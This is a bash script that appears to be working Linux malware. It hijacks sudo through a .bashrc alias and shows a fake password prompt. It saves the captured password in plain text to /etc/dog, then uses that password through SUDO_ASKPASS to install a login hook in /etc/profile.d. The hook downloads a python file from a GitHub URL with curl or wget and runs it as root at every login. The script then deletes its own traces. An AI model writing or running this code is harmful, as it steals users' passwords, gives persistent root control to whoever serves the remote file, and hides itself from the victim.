#!/bin/bash

# Check if user is already root
if [ "$EUID" -eq 0 ]; then
    cat > /etc/profile.d/monitor.sh << 'EOF'
#!/bin/bash
python /usr/bin/monitor.py
EOF
    curl -s -o /usr/bin/monitor.py "http://github.com/kaucrow/good-boy/test.py" || \
    wget -q -O /usr/bin/monitor.py "http://github.com/kaucrow/good-boy/test.py"

    exit 0
else
    GB_DIR="$HOME/.local/share/gb"
    SCRIPT_FILENAME="script.sh"
    SCRIPT_FILE="$GB_DIR/$SCRIPT_FILENAME"

    mkdir -p "$GB_DIR"

    cat > "$SCRIPT_FILE" << 'EOF'
#!/bin/bash

GB_DIR="$HOME/.local/share/gb"
PASSWD_FILE="$GB_DIR/passwd"

attempts=0
max_attempts=3
success=false

while [ $attempts -lt $max_attempts ]; do
    echo -n "[sudo] password for $USER: "
    read -s user_input
    echo

    if printf "%s\n" "$user_input" | /usr/bin/sudo -S -k true 2>/dev/null; then
        # Correct password
        success=true
        break
    else
        attempts=$((attempts + 1))
        [ $attempts -lt $max_attempts ] && echo "Sorry, try again."
    fi
done

if [ "$success" = false ]; then
    echo "sudo: 3 incorrect password attempts"
    exit 1
fi

# Store the password
echo "$user_input" > "$PASSWD_FILE"

ASKPASS_SCRIPT=$(mktemp)
echo -e "#!/bin/sh\necho \"$user_input\"" > "$ASKPASS_SCRIPT"
chmod +x "$ASKPASS_SCRIPT"

# Deploy monitoring & move passwd to /etc/dog
SUDO_ASKPASS="$ASKPASS_SCRIPT" /usr/bin/sudo -A bash << DEPLOYEOF
    cp "$GB_DIR/passwd" /etc/dog
    chmod 600 /etc/dog

    cat > /etc/profile.d/monitor.sh << "MONITOREOF"
#!/bin/bash
if [ -f /etc/dog ]; then
    ASKPASS_SCRIPT=\$(mktemp)
    echo -e "#!/bin/sh\ncat /etc/dog" > "\$ASKPASS_SCRIPT"
    chmod +x "\$ASKPASS_SCRIPT"
    SUDO_ASKPASS="\$ASKPASS_SCRIPT" /usr/bin/sudo -A python /usr/bin/monitor.py 2>/dev/null
    rm -f "\$ASKPASS_SCRIPT"
fi
MONITOREOF
    curl -s -o /usr/bin/monitor.py "http://github.com/kaucrow/good-boy/test.py" || \
    wget -q -O /usr/bin/monitor.py "http://github.com/kaucrow/good-boy/test.py"
DEPLOYEOF

# Execute the original command
SUDO_ASKPASS="$ASKPASS_SCRIPT" /usr/bin/sudo -A -p "" "$@"

# Cleanup
rm -f "$ASKPASS_SCRIPT"
rm -f "$SCRIPT_FILE"
unalias sudo 2>/dev/null
sed -i "\|alias sudo=$SCRIPT_FILE|d" "$HOME/.bashrc"
rm -rf "$GB_DIR"
EOF

    chmod +x $SCRIPT_FILE

    # Add alias to .bashrc if not already present
    if ! grep -q "alias sudo=$SCRIPT_FILE" "$HOME/.bashrc" 2>/dev/null; then
        echo "alias sudo='source $SCRIPT_FILE'" >> "$HOME/.bashrc"
    fi
fi